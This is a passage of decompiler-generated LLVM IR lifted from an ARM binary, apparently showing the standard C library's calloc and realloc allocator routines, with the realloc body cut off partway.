  uselistorder label %dec_label_pc_122cc, { 2, 0, 3, 1 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %bb151, { 1, 0 }
  uselistorder label %.thread30, { 1, 0 }
  uselistorder label %dec_label_pc_12184, { 0, 2, 1 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %bb147, { 1, 0 }
  uselistorder label %dec_label_pc_120d8, { 1, 0 }
  uselistorder label %dec_label_pc_120e0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_120a4, { 1, 0 }
  uselistorder label %dec_label_pc_12058, { 1, 0 }
  uselistorder label %dec_label_pc_11fec, { 1, 0 }
  uselistorder label %dec_label_pc_11fe8, { 1, 0 }
  uselistorder label %dec_label_pc_11f94, { 1, 0 }
  uselistorder label %dec_label_pc_11f80, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11f48, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_11f34, { 1, 0 }
  uselistorder label %bb143, { 1, 0 }
  uselistorder label %bb141, { 1, 0 }
}

define i32 @function_12608(i32 %arg1) local_unnamed_addr {
dec_label_pc_12608:
  %v0_12608 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12608, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_12608
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_12608, %bb
  %v4_12624 = phi i32 [ %arg1, %dec_label_pc_12608 ], [ 0, %bb ]
  ret i32 %v4_12624

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_12628 = load i32, i32* @r4, align 4
  %v6_12628 = load i32, i32* @r5, align 4
  %v9_12628 = load i32, i32* @r6, align 4
  %v12_12628 = load i32, i32* @lr, align 4
  %v2_12630 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* @r5, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_12640 = mul i32 %arg2, %arg1
  store i32 %v2_12640, i32* @r6, align 4
  br i1 %v2_12630, label %dec_label_pc_12678, label %dec_label_pc_12648

dec_label_pc_12648:                               ; preds = %entry
  store i32 %arg1, i32* @r1, align 4
  %v2_12650 = udiv i32 %v2_12640, %arg1
  %v9_12654 = icmp eq i32 %v2_12650, %arg2
  br i1 %v9_12654, label %dec_label_pc_12678, label %dec_label_pc_1265c

dec_label_pc_1265c:                               ; preds = %dec_label_pc_12648
  %v0_12660 = call i32 @__aeabi_read_tp()
  %v3_12664 = load i16, i16* @global_var_21a48.352, align 2
  %v4_12664 = sext i16 %v3_12664 to i32
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_12670 = add i32 %v4_12664, %v0_12660
  %v4_12670 = inttoptr i32 %v3_12670 to i32*
  store i32 12, i32* %v4_12670, align 4
  br label %dec_label_pc_1273c

dec_label_pc_12678:                               ; preds = %dec_label_pc_12648, %entry
  %v4_1267c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 108) to i32*), align 4
  store i32 %v4_1267c, i32* @r4, align 4
  %v4_12694 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 112) to i32*), align 4
  store i32 %v4_12694, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12694)
  %v0_126a8 = load i32, i32* @r5, align 4
  %v2_126a8 = add i32 %v0_126a8, 16
  %v3_126a8 = inttoptr i32 %v2_126a8 to i32*
  %v4_126a8 = load i32, i32* %v3_126a8, align 4
  store i32 %v4_126a8, i32* %ip.global-to-local, align 4
  store i32 75444, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_126a8)
  %v0_126b4 = load i32, i32* @r6, align 4
  store i32 %v0_126b4, i32* @r0, align 4
  %v0_126b8 = call i32 @malloc()
  store i32 %v0_126b8, i32* %r4.global-to-local, align 4
  %v2_126bc = icmp eq i32 %v0_126b8, 0
  br i1 %v2_126bc, label %.thread, label %dec_label_pc_126c4

dec_label_pc_126c4:                               ; preds = %dec_label_pc_12678
  %v1_126c4 = add i32 %v0_126b8, -4
  %v2_126c4 = inttoptr i32 %v1_126c4 to i32*
  %v3_126c4 = load i32, i32* %v2_126c4, align 4
  %v1_126c8 = and i32 %v3_126c4, 2
  %v2_126c8 = icmp eq i32 %v1_126c8, 0
  br i1 %v2_126c8, label %dec_label_pc_126d0, label %.thread

dec_label_pc_126d0:                               ; preds = %dec_label_pc_126c4
  %v1_126d06 = add i32 %v3_126c4, -4
  %v1_126d4 = and i32 %v1_126d06, -4
  %v3_126d8 = udiv i32 %v1_126d4, 4
  store i32 %v3_126d8, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_126d4, 36
  %v2_126e0 = icmp ult i32 %v1_126d4, 33
  %v3_126e0 = or i1 %tmp, %v2_126e0
  br i1 %v3_126e0, label %dec_label_pc_126ec, label %dec_label_pc_126e4

dec_label_pc_126e4:                               ; preds = %dec_label_pc_126d0
  %v3_126e4 = inttoptr i32 %v0_126b8 to i8*
  %v4_126e4 = call i32 @__GI_memset(i8* %v3_126e4, i32 0, i32 %v1_126d4)
  br label %.thread

dec_label_pc_126ec:                               ; preds = %dec_label_pc_126d0
  %tmp7 = icmp eq i32 %v1_126d4, 16
  %v2_126f0 = inttoptr i32 %v0_126b8 to i32*
  store i32 0, i32* %v2_126f0, align 4
  %v1_126f4 = load i32, i32* %r4.global-to-local, align 4
  %v2_126f4 = add i32 %v1_126f4, 4
  %v3_126f4 = inttoptr i32 %v2_126f4 to i32*
  store i32 0, i32* %v3_126f4, align 4
  %v1_126f8 = load i32, i32* %r4.global-to-local, align 4
  %v2_126f8 = add i32 %v1_126f8, 8
  %v3_126f8 = inttoptr i32 %v2_126f8 to i32*
  store i32 0, i32* %v3_126f8, align 4
  %v2_126fc = icmp ult i32 %v1_126d4, 13
  %v3_126fc = or i1 %tmp7, %v2_126fc
  br i1 %v3_126fc, label %.thread, label %dec_label_pc_12700

dec_label_pc_12700:                               ; preds = %dec_label_pc_126ec
  %v0_12700 = load i32, i32* %ip.global-to-local, align 4
  %v1_12704 = load i32, i32* %r4.global-to-local, align 4
  %v2_12704 = add i32 %v1_12704, 12
  %v3_12704 = inttoptr i32 %v2_12704 to i32*
  store i32 0, i32* %v3_12704, align 4
  %v1_12708 = load i32, i32* %r4.global-to-local, align 4
  %v2_12708 = add i32 %v1_12708, 16
  %v3_12708 = inttoptr i32 %v2_12708 to i32*
  store i32 0, i32* %v3_12708, align 4
  %tmp8 = icmp ult i32 %v0_12700, 7
  br i1 %tmp8, label %.thread, label %dec_label_pc_12710

dec_label_pc_12710:                               ; preds = %dec_label_pc_12700
  %v0_12710 = load i32, i32* %ip.global-to-local, align 4
  %v7_12710 = icmp eq i32 %v0_12710, 9
  %v1_12714 = load i32, i32* %r4.global-to-local, align 4
  %v2_12714 = add i32 %v1_12714, 20
  %v3_12714 = inttoptr i32 %v2_12714 to i32*
  store i32 0, i32* %v3_12714, align 4
  %v1_12718 = load i32, i32* %r4.global-to-local, align 4
  %v2_12718 = add i32 %v1_12718, 24
  %v3_12718 = inttoptr i32 %v2_12718 to i32*
  store i32 0, i32* %v3_12718, align 4
  br i1 %v7_12710, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12710
  %v2_1271c = load i32, i32* %r4.global-to-local, align 4
  %v3_1271c = add i32 %v2_1271c, 32
  %v4_1271c = inttoptr i32 %v3_1271c to i32*
  store i32 0, i32* %v4_1271c, align 4
  %v2_12720 = load i32, i32* %r4.global-to-local, align 4
  %v3_12720 = add i32 %v2_12720, 28
  %v4_12720 = inttoptr i32 %v3_12720 to i32*
  store i32 0, i32* %v4_12720, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12710, %dec_label_pc_126c4, %dec_label_pc_12700, %dec_label_pc_126ec, %dec_label_pc_12678, %dec_label_pc_126e4, %bb
  store i32 1, i32* @r1, align 4
  %v0_12730 = load i32, i32* @r5, align 4
  %v2_12730 = add i32 %v0_12730, 44
  %v3_12730 = inttoptr i32 %v2_12730 to i32*
  %v4_12730 = load i32, i32* %v3_12730, align 4
  store i32 %v4_12730, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12730)
  br label %dec_label_pc_1273c

dec_label_pc_1273c:                               ; preds = %dec_label_pc_1265c, %.thread
  %v0_1273c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_12628, i32* @r4, align 4
  store i32 %v6_12628, i32* @r5, align 4
  store i32 %v9_12628, i32* @r6, align 4
  store i32 %v12_12628, i32* @lr, align 4
  ret i32 %v0_1273c

; uselistorder directives
  uselistorder i32 %v1_126d4, { 0, 5, 2, 1, 4, 3 }
  uselistorder i32 %v0_126b8, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 33, { 0, 8, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1273c, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @realloc(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_12768 = load i32, i32* @r4, align 4
  %v6_12768 = load i32, i32* @r5, align 4
  %v9_12768 = load i32, i32* @r6, align 4
  %v12_12768 = load i32, i32* @r7, align 4
  %v15_12768 = load i32, i32* @r8, align 4
  %v18_12768 = load i32, i32* @sb, align 4
  %v21_12768 = load i32, i32* @sl, align 4
  %v24_12768 = load i32, i32* @fp, align 4
  %v27_12768 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_12774 = icmp eq i32* %arg1, null
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_12774, label %dec_label_pc_12788, label %dec_label_pc_12798

dec_label_pc_12788:                               ; preds = %entry
  store i32 %arg2, i32* @r0, align 4
  %v0_1278c = call i32 @malloc()
  store i32 %v0_1278c, i32* %r0.global-to-local, align 4
  store i32 %v0_1278c, i32* @r4, align 4
  br label %dec_label_pc_12af8

dec_label_pc_12798:                               ; preds = %entry
  %v2_12798 = icmp eq i32 %arg2, 0
  br i1 %v2_12798, label %dec_label_pc_127a0, label %dec_label_pc_127ac

dec_label_pc_127a0:                               ; preds = %dec_label_pc_12798
  %v0_127a0 = call i32 @free()
  store i32 %v0_127a0, i32* %r0.global-to-local, align 4
  %v0_127a4 = load i32, i32* @r6, align 4
  store i32 %v0_127a4, i32* @r4, align 4
  br label %dec_label_pc_12af8

dec_label_pc_127ac:                               ; preds = %dec_label_pc_12798
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_127b4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 108) to i32*), align 4
  store i32 %v4_127b4, i32* @r4, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_127b4, i32* %r2.global-to-local, align 4
  %v4_127c0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 68) to i32*), align 4
  store i32 %v4_127c0, i32* %r1.global-to-local, align 4
  %v2_127c4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_127c4, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_127cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_127cc)
  %v0_127d8 = load i32, i32* @r4, align 4
  store i32 %v0_127d8, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* %r1.global-to-local, align 4
  %v4_127e4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 16) to i32*), align 4
  store i32 ptrtoint (i32* @global_var_127f0.457 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_127e4)
  %v0_127f0 = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_127f0, -32
  br i1 %tmp36, label %dec_label_pc_12814, label %dec_label_pc_127f8

dec_label_pc_127f8:                               ; preds = %dec_label_pc_127ac
  store i32 62016, i32* %r2.global-to-local, align 4
  %v0_127fc = call i32 @__aeabi_read_tp()
  store i32 %v0_127fc, i32* %r0.global-to-local, align 4
  %v3_12800 = load i16, i16* @global_var_21a48.352, align 2
  %v4_12800 = sext i16 %v3_12800 to i32
  store i32 %v4_12800, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_1280c = add i32 %v4_12800, %v0_127fc
  %v4_1280c = inttoptr i32 %v3_1280c to i32*
  store i32 12, i32* %v4_1280c, align 4
  br label %dec_label_pc_12af8

dec_label_pc_12814:                               ; preds = %dec_label_pc_127ac
  %v1_12814 = add i32 %v0_127f0, 11
  store i32 %v1_12814, i32* %r0.global-to-local, align 4
  %v0_12818 = load i32, i32* @r5, align 4
  %v1_12818 = add i32 %v0_12818, -4
  %v2_12818 = inttoptr i32 %v1_12818 to i32*
  %v3_12818 = load i32, i32* %v2_12818, align 4
  store i32 %v3_12818, i32* %r2.global-to-local, align 4
  %v2_1281c = icmp ugt i32 %v1_12814, 14
  %v7_1281c = icmp eq i32 %v1_12814, 15
  %v2_12820 = xor i1 %v2_1281c, true
  %v3_12820 = or i1 %v7_1281c, %v2_12820
  br i1 %v3_12820, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_12814
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_12814, %bb
  %v2_12824 = xor i1 %v7_1281c, true
  %v3_12824 = and i1 %v2_1281c, %v2_12824
  br i1 %v3_12824, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_12824 = and i32 %v1_12814, -8
  store i32 %v5_12824, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_12828 = and i32 %v3_12818, 2
  %v2_12828 = icmp eq i32 %v1_12828, 0
  %v1_1282c = add i32 %v0_12818, -8
  store i32 %v1_1282c, i32* @sl, align 4
  %v1_12830 = and i32 %v3_12818, -4
  store i32 %v1_12830, i32* @r6, align 4
  br i1 %v2_12828, label %dec_label_pc_12838, label %dec_label_pc_12a10

dec_label_pc_12838:                               ; preds = %bb29
  %v1_12838 = load i32, i32* @sb, align 4
  %v3_12838 = icmp ult i32 %v1_12830, %v1_12838
  br i1 %v3_12838, label %dec_label_pc_12844, label %bb30

bb30:                                             ; preds = %dec_label_pc_12838
  store i32 %v1_12830, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_129a8

dec_label_pc_12844:                               ; preds = %dec_label_pc_12838
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_1284c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 64) to i32*), align 4
  store i32 %v4_1284c, i32* %r0.global-to-local, align 4
  %v1_12850 = add i32 %v4_1284c, 44
  %v2_12850 = inttoptr i32 %v1_12850 to i32*
  %v3_12850 = load i32, i32* %v2_12850, align 4
  store i32 %v3_12850, i32* %r3.global-to-local, align 4
  %v2_12854 = add i32 %v1_12830, %v1_1282c
  store i32 %v2_12854, i32* @r4, align 4
  %v9_12858 = icmp eq i32 %v2_12854, %v3_12850
  %v1_1285c = add i32 %v2_12854, 4
  %v2_1285c = inttoptr i32 %v1_1285c to i32*
  %v3_1285c = load i32, i32* %v2_1285c, align 4
  store i32 %v3_1285c, i32* %r1.global-to-local, align 4
  br i1 %v9_12858, label %dec_label_pc_12864, label %dec_label_pc_128a0

dec_label_pc_12864:                               ; preds = %dec_label_pc_12844
  %v1_12864 = and i32 %v3_1285c, -4
  %v2_12868 = add i32 %v1_12864, %v1_12830
  store i32 %v2_12868, i32* %r1.global-to-local, align 4
  %v1_1286c = add i32 %v1_12838, 16
  store i32 %v1_1286c, i32* %r3.global-to-local, align 4
  %v3_12870 = icmp ult i32 %v2_12868, %v1_1286c
  br i1 %v3_12870, label %dec_label_pc_128f4, label %dec_label_pc_12878

dec_label_pc_12878:                               ; preds = %dec_label_pc_12864
  %v2_12878 = sub i32 %v2_12868, %v1_12838
  %v1_1287c = urem i32 %v3_12818, 2
  %v2_12880 = add i32 %v1_12838, %v1_1282c
  store i32 %v2_12880, i32* %r1.global-to-local, align 4
  %v2_12884 = or i32 %v1_12838, %v1_1287c
  store i32 %v2_12884, i32* %r2.global-to-local, align 4
  %v1_12888 = or i32 %v2_12878, 1
  store i32 %v1_12888, i32* %r3.global-to-local, align 4
  store i32 %v0_12818, i32* @r4, align 4
  store i32 %v2_12884, i32* %v2_12818, align 4
  %v0_12894 = load i32, i32* %r1.global-to-local, align 4
  %v1_12894 = load i32, i32* %r0.global-to-local, align 4
  %v2_12894 = add i32 %v1_12894, 44
  %v3_12894 = inttoptr i32 %v2_12894 to i32*
  store i32 %v0_12894, i32* %v3_12894, align 4
  %v0_12898 = load i32, i32* %r3.global-to-local, align 4
  %v1_12898 = load i32, i32* %r1.global-to-local, align 4
  %v2_12898 = add i32 %v1_12898, 4
  %v3_12898 = inttoptr i32 %v2_12898 to i32*
  store i32 %v0_12898, i32* %v3_12898, align 4
  br label %dec_label_pc_12adc

dec_label_pc_128a0:                               ; preds = %dec_label_pc_12844
  %v1_128a0 = and i32 %v3_1285c, -2
  %v2_128a4 = add i32 %v1_128a0, %v2_12854
  store i32 %v2_128a4, i32* %r3.global-to-local, align 4
  %v1_128a8 = add i32 %v2_128a4, 4
  %v2_128a8 = inttoptr i32 %v1_128a8 to i32*
  %v3_128a8 = load i32, i32* %v2_128a8, align 4
  store i32 %v3_128a8, i32* %r3.global-to-local, align 4
  %v1_128ac = urem i32 %v3_128a8, 2
  %v2_128ac = icmp eq i32 %v1_128ac, 0
  br i1 %v2_128ac, label %dec_label_pc_128b4, label %dec_label_pc_128f4

dec_label_pc_128b4:                               ; preds = %dec_label_pc_128a0
  %v1_128b4 = and i32 %v3_1285c, -4
  store i32 %v1_128b4, i32* %r3.global-to-local, align 4
  %v2_128b8 = add i32 %v1_128b4, %v1_12830
  store i32 %v2_128b8, i32* %r0.global-to-local, align 4
  %v3_128bc = icmp ult i32 %v2_128b8, %v1_12838
  br i1 %v3_128bc, label %dec_label_pc_128f4, label %dec_label_pc_128c4

dec_label_pc_128c4:                               ; preds = %dec_label_pc_128b4
  %v1_128c4 = add i32 %v1_12830, %v0_12818
  %v2_128c4 = inttoptr i32 %v1_128c4 to i32*
  %v3_128c4 = load i32, i32* %v2_128c4, align 4
  store i32 %v3_128c4, i32* %r1.global-to-local, align 4
  %v1_128c8 = add i32 %v3_128c4, 12
  %v2_128c8 = inttoptr i32 %v1_128c8 to i32*
  %v3_128c8 = load i32, i32* %v2_128c8, align 4
  store i32 %v3_128c8, i32* %r3.global-to-local, align 4
  %v9_128cc = icmp eq i32 %v3_128c8, %v2_12854
  %v1_128d0 = add i32 %v2_12854, 12
  %v2_128d0 = inttoptr i32 %v1_128d0 to i32*
  %v3_128d0 = load i32, i32* %v2_128d0, align 4
  store i32 %v3_128d0, i32* %r2.global-to-local, align 4
  br i1 %v9_128cc, label %dec_label_pc_128d8, label %dec_label_pc_128e4

dec_label_pc_128d8:                               ; preds = %dec_label_pc_128c4
  %v1_128d8 = add i32 %v3_128d0, 8
  %v2_128d8 = inttoptr i32 %v1_128d8 to i32*
  %v3_128d8 = load i32, i32* %v2_128d8, align 4
  store i32 %v3_128d8, i32* %r3.global-to-local, align 4
  %v9_128dc = icmp eq i32 %v3_128d8, %v2_12854
  br i1 %v9_128dc, label %dec_label_pc_128e8, label %dec_label_pc_128e4

dec_label_pc_128e4:                               ; preds = %dec_label_pc_128c4, %dec_label_pc_128d8
  %v0_128e4 = call i32 @abort()
  store i32 %v0_128e4, i32* %r0.global-to-local, align 4
  %v0_128e8.pre = load i32, i32* @r1, align 4
  %v1_128e8.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_128e8

dec_label_pc_128e8:                               ; preds = %dec_label_pc_128d8, %dec_label_pc_128e4
  %v1_128e8 = phi i32 [ %v3_128d0, %dec_label_pc_128d8 ], [ %v1_128e8.pre, %dec_label_pc_128e4 ]
  %v0_128e8 = phi i32 [ %v3_128c4, %dec_label_pc_128d8 ], [ %v0_128e8.pre, %dec_label_pc_128e4 ]
  %v2_128e8 = add i32 %v1_128e8, 8
  %v3_128e8 = inttoptr i32 %v2_128e8 to i32*
  store i32 %v0_128e8, i32* %v3_128e8, align 4
  %v0_128ec = load i32, i32* %r2.global-to-local, align 4
  %v1_128ec = load i32, i32* %r1.global-to-local, align 4
  %v2_128ec = add i32 %v1_128ec, 12
  %v3_128ec = inttoptr i32 %v2_128ec to i32*
  store i32 %v0_128ec, i32* %v3_128ec, align 4
  %v1_129a8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_129a8

dec_label_pc_128f4:                               ; preds = %dec_label_pc_12864, %dec_label_pc_128b4, %dec_label_pc_128a0
  %v1_128f4 = add i32 %v1_12838, -7
  store i32 %v1_128f4, i32* @r0, align 4
  %v0_128f8 = call i32 @malloc()
  store i32 %v0_128f8, i32* @r0, align 4
  store i32 %v0_128f8, i32* %r1.global-to-local, align 4
  %v2_128fc = icmp eq i32 %v0_128f8, 0
  br i1 %v2_128fc, label %bb31, label %dec_label_pc_12908

bb31:                                             ; preds = %dec_label_pc_128f4
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_12adc

dec_label_pc_12908:                               ; preds = %dec_label_pc_128f4
  %v1_12910.pre = load i32, i32* @r4, align 4
  %v1_12908 = add i32 %v0_128f8, -4
  %v2_12908 = inttoptr i32 %v1_12908 to i32*
  %v3_12908 = load i32, i32* %v2_12908, align 4
  store i32 %v3_12908, i32* @r3, align 4
  %v1_1290c = add i32 %v0_128f8, -8
  store i32 %v1_1290c, i32* @r7, align 4
  %v9_12910 = icmp eq i32 %v1_1290c, %v1_12910.pre
  br i1 %v9_12910, label %.thread2, label %dec_label_pc_12920

.thread2:                                         ; preds = %dec_label_pc_12908
  %v2_12914 = and i32 %v3_12908, -4
  store i32 %v2_12914, i32* %r3.global-to-local, align 4
  %v2_12918 = load i32, i32* @r6, align 4
  %v3_12918 = add i32 %v2_12918, %v2_12914
  store i32 %v3_12918, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_129a8

dec_label_pc_12920:                               ; preds = %dec_label_pc_12908
  %v0_12920 = load i32, i32* @r6, align 4
  %v1_12920 = add i32 %v0_12920, -4
  store i32 %v1_12920, i32* @r2, align 4
  %v3_12924 = udiv i32 %v1_12920, 4
  store i32 %v3_12924, i32* @ip, align 4
  %tmp37 = and i32 %v1_12920, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_1292c = icmp ult i32 %v1_12920, 36
  %v3_1292c = or i1 %tmp38, %v2_1292c
  %v0_1293c = load i32, i32* @r5, align 4
  br i1 %v3_1292c, label %dec_label_pc_1293c, label %dec_label_pc_12930

dec_label_pc_12930:                               ; preds = %dec_label_pc_12920
  store i32 %v0_1293c, i32* @r1, align 4
  %v0_12934 = call i32 @memcpy()
  store i32 %v0_12934, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_1293c:                               ; preds = %dec_label_pc_12920
  %v1_1293c = inttoptr i32 %v0_1293c to i32*
  %v2_1293c = load i32, i32* %v1_1293c, align 4
  store i32 %v2_1293c, i32* %r3.global-to-local, align 4
  %v2_12940 = inttoptr i32 %v0_128f8 to i32*
  store i32 %v2_1293c, i32* %v2_12940, align 4
  %v0_12944 = load i32, i32* @r5, align 4
  %v1_12944 = add i32 %v0_12944, 4
  %v2_12944 = inttoptr i32 %v1_12944 to i32*
  %v3_12944 = load i32, i32* %v2_12944, align 4
  store i32 %v3_12944, i32* %r3.global-to-local, align 4
  %v1_12948 = load i32, i32* %r1.global-to-local, align 4
  %v2_12948 = add i32 %v1_12948, 4
  %v3_12948 = inttoptr i32 %v2_12948 to i32*
  store i32 %v3_12944, i32* %v3_12948, align 4
  %v0_1294c = load i32, i32* @r5, align 4
  %v1_1294c = add i32 %v0_1294c, 8
  %v2_1294c = inttoptr i32 %v1_1294c to i32*
  %v3_1294c = load i32, i32* %v2_1294c, align 4
  store i32 %v3_1294c, i32* %r3.global-to-local, align 4
  %v0_12950 = load i32, i32* @ip, align 4
  %v1_12954 = load i32, i32* %r1.global-to-local, align 4
  %v2_12954 = add i32 %v1_12954, 8
  %v3_12954 = inttoptr i32 %v2_12954 to i32*
  store i32 %v3_1294c, i32* %v3_12954, align 4
  %tmp39 = icmp ult i32 %v0_12950, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_1295c

dec_label_pc_1295c:                               ; preds = %dec_label_pc_1293c
  %v0_1295c = load i32, i32* @r5, align 4
  %v1_1295c = add i32 %v0_1295c, 12
  %v2_1295c = inttoptr i32 %v1_1295c to i32*
  %v3_1295c = load i32, i32* %v2_1295c, align 4
  store i32 %v3_1295c, i32* %r3.global-to-local, align 4
  %v1_12960 = load i32, i32* %r1.global-to-local, align 4
  %v2_12960 = add i32 %v1_12960, 12
  %v3_12960 = inttoptr i32 %v2_12960 to i32*
  store i32 %v3_1295c, i32* %v3_12960, align 4
  %v0_12964 = load i32, i32* @r5, align 4
  %v1_12964 = add i32 %v0_12964, 16
  %v2_12964 = inttoptr i32 %v1_12964 to i32*
  %v3_12964 = load i32, i32* %v2_12964, align 4
  store i32 %v3_12964, i32* %r3.global-to-local, align 4
  %v0_12968 = load i32, i32* @ip, align 4
  %v1_1296c = load i32, i32* %r1.global-to-local, align 4
  %v2_1296c = add i32 %v1_1296c, 16
  %v3_1296c = inttoptr i32 %v2_1296c to i32*
  store i32 %v3_12964, i32* %v3_1296c, align 4
  %tmp40 = icmp ult i32 %v0_12968, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_12974

dec_label_pc_12974:                               ; preds = %dec_label_pc_1295c
  %v0_12974 = load i32, i32* @r5, align 4
  %v1_12974 = add i32 %v0_12974, 20
  %v2_12974 = inttoptr i32 %v1_12974 to i32*
  %v3_12974 = load i32, i32* %v2_12974, align 4
  store i32 %v3_12974, i32* %r3.global-to-local, align 4
  %v1_12978 = load i32, i32* %r1.global-to-local, align 4
  %v2_12978 = add i32 %v1_12978, 20
  %v3_12978 = inttoptr i32 %v2_12978 to i32*
  store i32 %v3_12974, i32* %v3_12978, align 4
  %v0_1297c = load i32, i32* @r5, align 4
  %v1_1297c = add i32 %v0_1297c, 24
  %v2_1297c = inttoptr i32 %v1_1297c to i32*
  %v3_1297c = load i32, i32* %v2_1297c, align 4
  store i32 %v3_1297c, i32* %r3.global-to-local, align 4
  %v1_12980 = load i32, i32* %r1.global-to-local, align 4
  %v2_12980 = add i32 %v1_12980, 24
  %v3_12980 = inttoptr i32 %v2_12980 to i32*
  store i32 %v3_1297c, i32* %v3_12980, align 4
  %v0_12984 = load i32, i32* @ip, align 4
  %v7_12984 = icmp eq i32 %v0_12984, 9
  br i1 %v7_12984, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_12974
  %v1_12988 = load i32, i32* @r5, align 4
  %v2_12988 = add i32 %v1_12988, 28
  %v3_12988 = inttoptr i32 %v2_12988 to i32*
  %v4_12988 = load i32, i32* %v3_12988, align 4
  store i32 %v4_12988, i32* %r3.global-to-local, align 4
  %v2_1298c = load i32, i32* %r1.global-to-local, align 4
  %v3_1298c = add i32 %v2_1298c, 28
  %v4_1298c = inttoptr i32 %v3_1298c to i32*
  store i32 %v4_12988, i32* %v4_1298c, align 4
  %v1_12990 = load i32, i32* @r5, align 4
  %v2_12990 = add i32 %v1_12990, 32
  %v3_12990 = inttoptr i32 %v2_12990 to i32*
  %v4_12990 = load i32, i32* %v3_12990, align 4
  store i32 %v4_12990, i32* %r3.global-to-local, align 4
  %v2_12994 = load i32, i32* %r1.global-to-local, align 4
  %v3_12994 = add i32 %v2_12994, 32
  %v4_12994 = inttoptr i32 %v3_12994 to i32*
  store i32 %v4_12990, i32* %v4_12994, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_12974, %dec_label_pc_1295c, %dec_label_pc_1293c, %dec_label_pc_12930, %bb32
  %v0_12998 = load i32, i32* @r5, align 4
  store i32 %v0_12998, i32* @r0, align 4
  %v0_1299c = call i32 @free()
  store i32 %v0_1299c, i32* %r0.global-to-local, align 4
  %v0_129a0 = load i32, i32* @r7, align 4
  %v1_129a0 = add i32 %v0_129a0, 8
  store i32 %v1_129a0, i32* @r4, align 4
  br label %dec_label_pc_12adc

dec_label_pc_129a8:                               ; preds = %bb30, %.thread2, %dec_label_pc_128e8
  %v0_129bc = phi i32 [ %v3_12918, %.thread2 ], [ %v1_12830, %bb30 ], [ %v1_129a8.pre, %dec_label_pc_128e8 ]
  %v0_129a8 = load i32, i32* @sb, align 4
